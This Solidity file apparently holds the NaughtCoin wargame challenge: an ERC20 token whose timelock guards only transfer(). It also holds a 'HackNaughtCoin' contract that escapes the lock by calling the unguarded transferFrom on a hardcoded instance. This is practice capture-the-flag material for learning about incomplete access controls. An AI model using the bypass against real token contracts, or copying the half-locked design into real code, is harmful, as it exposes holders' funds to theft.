// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
}

contract HackNaughtCoin {
    NaughtCoin public naughtCoin = NaughtCoin(0x415A3D25c76fc8497D0A9477710d072964589EF5);
    address public sender = 0xe8366E50ed089Eea4df663116e257B5D79fbD953;
    address public recipient = 0x0DE1343a2756EFf757342B9fA567D2e2Cdf93035;
    uint256 public amount = 1000000000000000000000000;
    
    /**
     * @dev You should approve `amount` for this contract before calling this function
     */
    function callTrasnferFrom() public {
        naughtCoin.transferFrom(sender, recipient, amount);
    }
}